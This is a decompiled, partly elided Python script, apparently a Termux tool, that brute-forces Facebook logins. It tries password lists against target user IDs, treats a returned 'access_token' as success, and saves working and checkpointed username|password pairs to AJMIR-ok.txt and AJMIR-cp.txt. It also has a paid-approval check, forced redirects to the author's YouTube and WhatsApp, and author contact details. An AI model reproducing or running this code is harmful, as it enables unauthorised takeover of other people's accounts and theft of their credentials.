# Decompile by Mardis (Tools By Ajmir king)
# Time Succes decompile : 2023/12/08 15:55
...
\033[0;92m #     #  #####  #     # ### #     #    #    # ### #     #  #####  
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;91mAUTHOR   : MR-AJMIR        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : AJMIR-HOSSAIN-404\033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : Ajmir Hossain      \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +8801813225678     \033[1;93m▇▇
...
def reg():
    os.system('termux-setup-storage')
    os.system('clear')
    os.system('xdg-open https://www.youtube.com/@Ajmir_142')
    logo()
    print ('')
    ...
    try:
        ...
        reg2()
    r = requests.get('https://github.com/AJMIR-HOSSAIN-404/PAID2/blob/main/Approve.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
...
def chigozie():
    ...
    if cookie in['OPEN','Open','open']:
      jalan("\n  %s* %sanda akan di arahkan ke YouTube"%(O,O));time.sleep(3);os.system('xdg-open https://wa.me/+8801813225678');chigozie()
    try:
...
def hasil(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        ...
        print('----------------------------------------------')
        print(' [%s+%s] \033[1;97mTOTAL OK : %s --- \033[1;97mAJMIR-ok.txt'%(O,O,str(len(ok))))
        print(' [%s+%s] \033[1;97mTOTAL CP : %s --- \033[1;97mAJMIR-cp.txt'%(O,O,str(len(cp))))
        print('----------------------------------------------')
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : MR-Ajmir 😈😈");time.sleep (0.03)
    print("             [*]. FACEBOOK   : Ajmir Hossain");time.sleep (0.03)
    print("             [*]. GITHUB     : AJMIR-HOSSAIN-404");time.sleep (0.03)   
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [AJMIR] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                print('\r [OK-AJMIR] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('AJMIR-ok.txt' , 'a').write('%s\n' % wrt)
                break
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-AJMIR] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('AJMIR-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
